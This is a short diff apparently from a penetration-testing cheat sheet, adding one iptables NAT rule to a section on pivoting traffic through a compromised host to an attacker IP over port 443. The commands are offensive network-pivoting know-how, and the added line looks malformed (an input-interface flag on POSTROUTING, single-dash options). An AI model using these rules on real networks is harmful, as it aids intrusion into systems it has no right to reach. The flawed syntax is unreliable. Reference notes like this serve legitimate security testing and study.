@@ -248,3 +248,4 @@ iptables -P INPUT DROP                                                          
 \> echo "1" > /proc/sys/net/ipv4/ip_forward
 \# OR -> sysctl net.ipv4.ip_forward=1
 \> iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d <pivotip> --dport 443 -to-destination <attk_ip>:443
+\> iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s <target subnet cidr> -d <attackip> --dport 443 -to-source <pivotip>
